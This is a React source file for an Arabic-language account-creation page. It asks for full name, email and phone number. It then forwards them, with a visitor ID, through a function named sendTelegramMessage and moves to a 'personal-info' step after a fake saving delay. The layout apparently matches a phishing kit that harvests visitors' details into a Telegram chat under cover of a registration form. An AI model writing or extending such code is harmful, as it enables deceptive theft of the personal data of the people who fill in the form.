import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useRegistration } from '../contexts/RegistrationContext';
import LoadingScreen from '../components/LoadingScreen';
import Header from '../components/Header';
import Footer from '../components/Footer';

const AccountCreation = () => {
  const navigate = useNavigate();
  const { updateFormData, sendTelegramMessage, formData } = useRegistration();
  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!fullName || !email || !phone) {
      setError('الرجاء إدخال جميع البيانات');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      updateFormData({ fullName, email, phone });
      
      await sendTelegramMessage(
        `📝 بيانات إنشاء الحساب\n\n` +
        `👤 الاسم: ${fullName}\n` +
        `📧 البريد: ${email}\n` +
        `📱 الهاتف: ${phone}\n` +
        `🆔 معرف المستخدم: ${formData.visitorId || 'غير متوفر'}`
      );

      setTimeout(() => {
        setIsLoading(false);
        navigate('/personal-info');
      }, 2000);
    } catch (err) {
      setIsLoading(false);
      setError('حدث خطأ، الرجاء المحاولة مرة أخرى');
    }
  };

  if (isLoading) {
    return <LoadingScreen message="جاري حفظ البيانات..." />;
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
      <Header />

      <div className="flex-1 flex flex-col items-center justify-center p-6">
        <div className="bg-white rounded-2xl shadow-lg p-8 w-full max-w-md">
          <h1 className="text-2xl font-bold text-center text-[#6A0F49] mb-6">
            إنشاء حساب جديد
          </h1>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                الاسم الكامل
              </label>
              <input
                type="text"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#6A0F49] focus:border-transparent text-right"
                placeholder="أدخل الاسم الكامل"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                البريد الإلكتروني
              </label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#6A0F49] focus:border-transparent text-right"
                placeholder="أدخل البريد الإلكتروني"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                رقم الهاتف
              </label>
              <input
                type="tel"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#6A0F49] focus:border-transparent text-right"
                placeholder="أدخل رقم الهاتف"
              />
            </div>

            {error && (
              <div className="text-red-500 text-sm text-center">{error}</div>
            )}

            <button
              type="submit"
              className="w-full bg-[#6A0F49] text-white py-3 rounded-lg font-semibold hover:bg-[#5A0D3D] transition-colors"
            >
              متابعة
            </button>
          </form>
        </div>
      </div>

      <Footer />
    </div>
  );
};

export default AccountCreation;
